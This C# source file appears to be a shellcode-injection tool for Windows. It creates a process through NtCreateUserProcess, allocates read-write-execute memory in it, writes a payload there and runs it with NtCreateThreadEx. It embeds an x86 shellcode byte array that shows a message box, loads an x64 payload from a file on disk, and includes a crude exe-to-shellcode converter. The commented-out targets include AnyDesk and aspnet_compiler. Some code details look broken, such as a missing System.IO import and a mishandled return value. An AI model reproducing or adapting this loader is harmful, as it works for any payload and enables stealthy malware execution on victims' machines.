
using System;
using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
namespace NtCreateUserProcess
{
    internal static class Program
    {
        // private static readonly uint SECTION_MAP_READ = 0x0004;
        // private static readonly uint SECTION_MAP_WRITE = 0x0002;
        // private static readonly uint SECTION_MAP_EXECUTE = 0x0008;
        private static readonly uint PAGE_EXECUTE_READWRITE = 0x40;
        // private static readonly uint SEC_COMMIT = 0x8000000;
        // private static readonly uint PAGE_READWRITE = 0x04;
        // private static readonly uint PAGE_READEXECUTE = 0x20;
        // private static readonly uint PAGE_NOACCESS = 0x01;
        // private static readonly uint MEM_RELEASE = 0x00008000;
        // private static readonly uint MEM_DECOMMIT = 0x00004000;
        private static readonly uint MEM_COMMIT = 0x1000;
        private static readonly uint MEM_RESERVE = 0x2000;
        // private static readonly uint DELETE = 0x00010000;
        private static readonly uint STATUS_SUCCESS = 0x00000000;
        [DllImport("ntdll.dll")]
        private static extern void RtlInitUnicodeString(
            ref UNICODE_STRING destinationString,
            [MarshalAs(UnmanagedType.LPWStr)] string sourceString);

        [DllImport("ntdll.dll")]
        private static extern uint RtlCreateProcessParametersEx(
            ref IntPtr processParameters,
            ref UNICODE_STRING imagePathName,
            IntPtr dllPath,
            IntPtr currentDirectory,
            IntPtr commandLine,
            IntPtr environment,
            IntPtr windowTitle,
            IntPtr desktopInfo,
            IntPtr shellInfo,
            IntPtr runtimeData,
            uint flags);

        [DllImport("ntdll.dll")]
        private static extern uint NtCreateUserProcess(
            ref IntPtr processHandle,
            ref IntPtr threadHandle,
            long processDesiredAccess,
            long threadDesiredAccess,
            IntPtr processObjectAttributes,
            IntPtr threadObjectAttributes,
            uint processFlags,
            uint threadFlags,
            IntPtr processParameters,
            ref PS_CREATE_INFO psCreateInfo,
            ref PS_ATTRIBUTE_LIST psAttributeList);
        [DllImport("ntdll.dll")]
        private static extern bool NtGetContextThread(IntPtr threadHandle, int[] context);
        [DllImport("ntdll.dll")]
        private static extern int NtAllocateVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, IntPtr zeroBits, ref uint regionSize, uint allocationType, uint protect);

        [DllImport("ntdll.dll")]
        private static extern int NtFreeVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, ref uint regionSize, uint freeType);

        [DllImport("ntdll.dll")]
        private static extern int NtWriteVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, uint bufferSize, out uint numberOfBytesWritten);

        [DllImport("ntdll.dll")]
        private static extern int NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr bytesBuffer);

        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        public static extern bool IsWow64Process([In] IntPtr hProcess, [Out] out bool lpSystemInfo);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtReadVirtualMemory(IntPtr process, IntPtr basicAddress, out byte[] buffer, uint bufferSize, out int bytesRead);

        [DllImport("ntdll.dll")]
        private static extern int ZwUnmapViewOfSection(IntPtr process, int baseAddress);

        [DllImport("Kernel32", SetLastError = true)]
        private static extern int VirtualQueryEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            out MEMORY_BASIC_INFORMATION lpBuffer,
            uint dwLength
        );

        [StructLayout(LayoutKind.Sequential)]
        public struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public IntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
        }

        public enum MemoryState : uint
        {
            MEM_FREE = 0x10000,
            MEM_RESERVE = 0x2000,
            MEM_COMMIT = 0x1000
        }

        public enum MemoryType : uint
        {
            MEM_IMAGE = 0x1000000,
            MEM_MAPPED = 0x40000,
            MEM_PRIVATE = 0x20000
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct PS_CREATE_INFO
        {
            public UIntPtr Size;
            public PS_CREATE_STATE State;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 76)]
            public byte[] unused;
        }

        private enum PS_CREATE_STATE
        {
            PsCreateInitialState = 0,
            PsCreateFailOnFileOpen = 1,
            PsCreateFailOnSectionCreate = 2,
            PsCreateFailExeFormat = 3,
            PsCreateFailMachineMismatch = 4,
            PsCreateFailExeName = 5,
            PsCreateSuccess = 6,
            PsCreateMaximumStates = 7
        };

        [StructLayout(LayoutKind.Sequential)]
        private struct PS_ATTRIBUTE
        {
            public ulong Attribute;
            public ulong Size;
            public IntPtr Value;
            public IntPtr ReturnLength;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PS_ATTRIBUTE_LIST
        {
            public UIntPtr TotalLength;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
            public PS_ATTRIBUTE[] Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        public static void Main(string[] args)
        {
            string imagePath = @"\??\D:\hw.exe";
            //string sourcePath = @"\??\C:\Windows\System32\calc.exe";
            string sourcePath = @"\??\D:\test.exe";
            //string sourcePath = @"D:\Tools\Dev Tools\VSCode-win32-x64-1.89.1\Code.exe";
            //string sourcePath = @"\??\C:\Windows\WinSxS\x86_aspnet_compiler_b03f5f7f11d50a3a_10.0.19041.1_none_d9afbb23e990d44a\aspnet_compiler.exe";
            //string sourcePath = @"\??\C:\Program Files (x86)\AnyDesk\AnyDesk.exe";
            Excute(sourcePath, imagePath);

        }

        public static void Excute(string srcPath, string path)
        {
            var hProcess = IntPtr.Zero;
            var hThread = IntPtr.Zero;
            try
            {
                //var imagePath = new UNICODE_STRING();
                //RtlInitUnicodeString(ref imagePath, path);
                byte[] plaloads = File.ReadAllBytes(path);
                var sourcePath = new UNICODE_STRING();
                RtlInitUnicodeString(ref sourcePath, srcPath);

                // byte[] payloads = File.ReadAllBytes(path);
                var processParams = IntPtr.Zero;
                var status = RtlCreateProcessParametersEx(
                    ref processParams,
                    ref sourcePath,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    0x01);

                if (status != STATUS_SUCCESS)
                {
                    Console.WriteLine("RtlCreateProcessParametersEx failed");
                    throw new Exception();
                }
                else
                {
                    Console.WriteLine("[+] Created Process Parameters Id: 0x" + processParams.ToString("X"));
                }

                var ci = new PS_CREATE_INFO();
                ci.Size = (UIntPtr)88; // sizeof(PS_CREATE_INFO)
                ci.State = PS_CREATE_STATE.PsCreateInitialState;
                ci.unused = new byte[76];

                // var attribute = new PS_ATTRIBUTE();
                var attributeList = new PS_ATTRIBUTE_LIST();
                attributeList.TotalLength = (UIntPtr)40; // this is sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE) 
                attributeList.Attributes = new PS_ATTRIBUTE[2];

                attributeList.Attributes[0].Attribute = 0x20005;
                attributeList.Attributes[0].Size = sourcePath.Length;
                attributeList.Attributes[0].Value = sourcePath.Buffer;

                status = NtCreateUserProcess(
                    ref hProcess,
                    ref hThread,
                    2097151,
                    2097151,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    0,
                    0,
                    processParams,
                    ref ci,
                    ref attributeList);

                if (status != STATUS_SUCCESS)
                {
                    int toBase = 16;
                    string hex = Convert.ToString(status, toBase);
                    Console.WriteLine(hex);
                    throw new Exception();
                }
                else
                {
                    Console.WriteLine("[+] Processs is created successfuly: 0x" + status.ToString("X"));
                    Console.WriteLine("[+] Created Process Id: 0x" + hProcess.ToString("X"));

                }

                bool processType = false;

                byte[] buf;

                IsWow64Process(hProcess, out processType);

                byte[] bufx86 = new byte[] {
                    0x33, 0xc9, 0x64, 0x8b, 0x49, 0x30, 0x8b, 0x49, 0x0c, 0x8b, 0x49, 0x1c,
                    0x8b, 0x59, 0x08, 0x8b, 0x41, 0x20, 0x8b, 0x09, 0x80, 0x78, 0x0c, 0x33,
                    0x75, 0xf2, 0x8b, 0xeb, 0x03, 0x6d, 0x3c, 0x8b, 0x6d, 0x78, 0x03, 0xeb,
                    0x8b, 0x45, 0x20, 0x03, 0xc3, 0x33, 0xd2, 0x8b, 0x34, 0x90, 0x03, 0xf3,
                    0x42, 0x81, 0x3e, 0x47, 0x65, 0x74, 0x50, 0x75, 0xf2, 0x81, 0x7e, 0x04,
                    0x72, 0x6f, 0x63, 0x41, 0x75, 0xe9, 0x8b, 0x75, 0x24, 0x03, 0xf3, 0x66,
                    0x8b, 0x14, 0x56, 0x8b, 0x75, 0x1c, 0x03, 0xf3, 0x8b, 0x74, 0x96, 0xfc,
                    0x03, 0xf3, 0x33, 0xff, 0x57, 0x68, 0x61, 0x72, 0x79, 0x41, 0x68, 0x4c,
                    0x69, 0x62, 0x72, 0x68, 0x4c, 0x6f, 0x61, 0x64, 0x54, 0x53, 0xff, 0xd6,
                    0x33, 0xc9, 0x57, 0x66, 0xb9, 0x33, 0x32, 0x51, 0x68, 0x75, 0x73, 0x65,
                    0x72, 0x54, 0xff, 0xd0, 0x57, 0x68, 0x6f, 0x78, 0x41, 0x01, 0xfe, 0x4c,
                    0x24, 0x03, 0x68, 0x61, 0x67, 0x65, 0x42, 0x68, 0x4d, 0x65, 0x73, 0x73,
                    0x54, 0x50, 0xff, 0xd6, 0x57, 0x68, 0x72, 0x6c, 0x64, 0x21, 0x68, 0x6f,
                    0x20, 0x57, 0x6f, 0x68, 0x48, 0x65, 0x6c, 0x6c, 0x8b, 0xcc, 0x57, 0x57,
                    0x51, 0x57, 0xff, 0xd0, 0x57, 0x68, 0x65, 0x73, 0x73, 0x01, 0xfe, 0x4c,
                    0x24, 0x03, 0x68, 0x50, 0x72, 0x6f, 0x63, 0x68, 0x45, 0x78, 0x69, 0x74,
                    0x54, 0x53, 0xff, 0xd6, 0x57, 0xff, 0xd0
                };

                byte[] bufx64 = plaloads;/* new byte[] {
                    0x48, 0x31, 0xc9,                               // xor rcx, rcx
                    0x65, 0x48, 0x8b, 0x41, 0x60,                   // mov rax, gs:[rcx+0x60]
                    0x48, 0x8b, 0x40, 0x18,                         // mov rax, [rax+0x18]
                    0x48, 0x8b, 0x70, 0x10,                         // mov rsi, [rax+0x10]
                    0x48, 0xad,                                     // lodsq
                    0x48, 0x8b, 0x30,                               // mov rsi, [rax]
                    0x48, 0x8b, 0x7e, 0x30,                         // mov rdi, [rsi+0x30]
                    0x48, 0x8b, 0x36,                               // mov rsi, [rsi]
                    0x48, 0x8d, 0x7f, 0x10,                         // lea rdi, [rdi+0x10]
                    0x48, 0x31, 0xdb,                               // xor rbx, rbx
                    0x48, 0x31, 0xc0,                               // xor rax, rax
                    0x48, 0x89, 0xde,                               // mov rsi, rbx
                    0x48, 0x8b, 0x36,                               // mov rsi, [rsi]
                    0x48, 0x8d, 0x3d, 0x08, 0x00, 0x00, 0x00,       // lea rdi, [rip+0x8]
                    0x48, 0x31, 0xc9,                               // xor rcx, rcx
                    0x48, 0x31, 0xd2,                               // xor rdx, rdx
                    0xff, 0xd7,                                     // call rdi
                    0xcc,                                           // int3 (breakpoint)
                    // "MessageBoxA"
                    0x4d, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6f, 0x78, 0x41, 0x00
                };*/

                if (processType)
                {
                    //buf = ConvertExeToShellcode(path);
                    buf = bufx86;
                    Console.WriteLine("[+] Shellcode injected to x86 process.");
                    PrintShellcode(buf);
                }
                else
                {
                    buf = bufx64;
                    Console.WriteLine("[+] Shellcode injected to x64 process.");
                    //PrintShellcode(buf);
                }
                //return;


                IntPtr baseAddress = new IntPtr();
                uint regionSize = (uint)buf.Length;

                IntPtr freeAddress = IntPtr.Zero;
                MEMORY_BASIC_INFORMATION mbi;
                bool freeIsIn = false;
               /* while (VirtualQueryEx(hProcess, freeAddress, out mbi, regionSize) != 0)
                {
                    if ((mbi.State == (uint)MemoryState.MEM_FREE))
                    {
                        freeIsIn = true;
                        Console.WriteLine("[+] Needed memory Size: RegionSize =" + regionSize);
                        Console.WriteLine("[+] Free memory region: BaseAddress = {mbi.BaseAddress}, RegionSize =" + mbi.RegionSize);
                        //baseAddress = mbi.BaseAddress;
                        break;
                    }
                    freeAddress = new IntPtr(mbi.BaseAddress.ToInt64() + mbi.RegionSize.ToInt64());
                }
                if (!freeIsIn)
                {
                    Console.WriteLine("[-] Free memory None: 0x" + hProcess.ToString("X"));
                    Console.WriteLine("[-] Needed memory Size: RegionSize =" + regionSize);
                    throw new Exception();
                }*/
                // Memory Allocation
                int ntStatus = NtAllocateVirtualMemory(hProcess, ref baseAddress, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

                if (ntStatus != STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] NtAllocateVirtualMemory Fail result: 0x" + ntStatus.ToString("X"));
                    Console.WriteLine("[-] NtAllocateVirtualMemory BaseAddress: 0x" + baseAddress.ToString("X"));
                    Console.WriteLine("[-] Created Process Id: 0x" + hProcess.ToString("X"));
                    throw new Exception();
                }
                else
                {
                    Console.WriteLine("[+] NtAllocateVirtualMemory Success result: 0x" + ntStatus.ToString("X"));
                    Console.WriteLine("[+] NtAllocateVirtualMemory BaseAddress: 0x" + baseAddress.ToString("X"));
                    Console.WriteLine("[+] Created Process Id: 0x" + hProcess.ToString("X"));
                }
                // Convert Demical to Hex

                uint wr = 0;
                ntStatus = NtWriteVirtualMemory(hProcess, baseAddress, buf, regionSize, out wr);

                if (ntStatus != STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Faied Buffer has been written to the targeted process: 0x" + ntStatus.ToString("X"));
                    Console.WriteLine("[-] WriteMemory BaseAddress: 0x" + baseAddress.ToString("X"));
                    Console.WriteLine("[-] Created Process Id: 0x" + hProcess.ToString("X"));
                    throw new Exception();
                }
                else
                {
                    Console.WriteLine("[+] Success Buffer has been written to the targeted process!: 0x" + ntStatus.ToString("X"));
                    Console.WriteLine("[+] WriteMemory BaseAddress: 0x" + baseAddress.ToString("X"));
                    Console.WriteLine("[+] Created Process Id: 0x" + hProcess.ToString("X"));
                }

                IntPtr hRemoteThread;
                hThread = (IntPtr)NtCreateThreadEx(out hRemoteThread, 0x1FFFFF, IntPtr.Zero, hProcess, baseAddress, processParams, false, 0, 0, 0, IntPtr.Zero);

                if (hThread == (IntPtr)STATUS_SUCCESS)
                {
                    Console.WriteLine("[+] Injection Succeded! Thread ID: 0x" + hRemoteThread.ToString("X"));
                    Console.WriteLine("[+] Created Process Id: 0x" + hProcess.ToString("X"));

                }
                else
                {
                    Console.WriteLine("[-] Injection failed! Thread ID: 0x" + hRemoteThread.ToString("X"));
                    Console.WriteLine("[-] Created Process Id: 0x" + hProcess.ToString("X"));

                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred:");
                Console.WriteLine("Message: " + ex.Message);
                Console.WriteLine("Stack Trace: " + ex.StackTrace);
                Console.WriteLine("Source: " + ex.Source);
                if (ex.InnerException != null)
                {
                    Console.WriteLine("Inner Exception: " + ex.InnerException.Message);
                }
            }
        }
        static void PrintShellcode(byte[] shellcode)
        {
            foreach (byte b in shellcode)
            {
                Console.Write("0x{0:X2}, ", b);
            }
            Console.WriteLine();
        }
        public static bool Is64BitExcutable(string path)
        {
            using (FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Read))
            {
                using (BinaryReader br = new BinaryReader(fs))
                {
                    // Read DOS header
                    fs.Seek(0x3C, SeekOrigin.Begin);
                    int peHeaderOffset = br.ReadInt32();

                    // Read PE header
                    fs.Seek(peHeaderOffset, SeekOrigin.Begin);
                    uint peHeader = br.ReadUInt32();
                    if (peHeader != 0x00004550) // "PE\0\0"
                    {
                        throw new InvalidDataException("Not a valid PE file.");
                    }

                    // Read IMAGE_FILE_HEADER
                    fs.Seek(peHeaderOffset + 4, SeekOrigin.Begin);
                    ushort machine = br.ReadUInt16();

                    // Machine type
                    const ushort IMAGE_FILE_MACHINE_I386 = 0x014c; // 32-bit
                    const ushort IMAGE_FILE_MACHINE_AMD64 = 0x8664; // 64-bit

                    if (machine == IMAGE_FILE_MACHINE_AMD64)
                    {
                        return true; // 64-bit
                    }
                    else if (machine == IMAGE_FILE_MACHINE_I386)
                    {
                        return false; // 32-bit
                    }
                    else
                    {
                        throw new InvalidDataException("Unknown machine type.");
                    }
                }
            }
        }
        public static byte[] ConvertExeToShellcode(string exePath)
        {
            byte[] exeBytes = File.ReadAllBytes(exePath);

            // Find the start of the PE header
            int peHeaderOffset = BitConverter.ToInt32(exeBytes, 0x3C);

            // Check PE signature
            if (BitConverter.ToUInt32(exeBytes, peHeaderOffset) != 0x00004550)
            {
                throw new InvalidDataException("Not a valid PE file.");
            }

            // Read IMAGE_FILE_HEADER
            int machineOffset = peHeaderOffset + 4;
            ushort machine = BitConverter.ToUInt16(exeBytes, machineOffset);

            // Check if 32-bit or 64-bit
            bool is64Bit = machine == 0x8664;

            // Read sections and create shellcode
            int numberOfSections = BitConverter.ToInt16(exeBytes, peHeaderOffset + 6);
            int optionalHeaderSize = BitConverter.ToInt16(exeBytes, peHeaderOffset + 20);
            int optionalHeaderOffset = peHeaderOffset + 24;
            int sectionHeaderOffset = optionalHeaderOffset + optionalHeaderSize;

            MemoryStream shellcodeStream = new MemoryStream();
            BinaryWriter shellcodeWriter = new BinaryWriter(shellcodeStream);

            // Copy the code section to shellcode
            for (int i = 0; i < numberOfSections; i++)
            {
                int sectionOffset = sectionHeaderOffset + (i * 40);
                int sectionSize = BitConverter.ToInt32(exeBytes, sectionOffset + 16);
                int sectionRawDataPtr = BitConverter.ToInt32(exeBytes, sectionOffset + 20);
                int sectionVirtualAddress = BitConverter.ToInt32(exeBytes, sectionOffset + 12);

                // Only process .text (code) section for simplicity
                string sectionName = Encoding.UTF8.GetString(exeBytes, sectionOffset, 8).TrimEnd('\0');
                if (sectionName == ".text")
                {
                    byte[] sectionData = new byte[sectionSize];
                    Array.Copy(exeBytes, sectionRawDataPtr, sectionData, 0, sectionSize);
                    shellcodeWriter.Write(sectionData);
                }
            }

            return shellcodeStream.ToArray();
        }
    }
}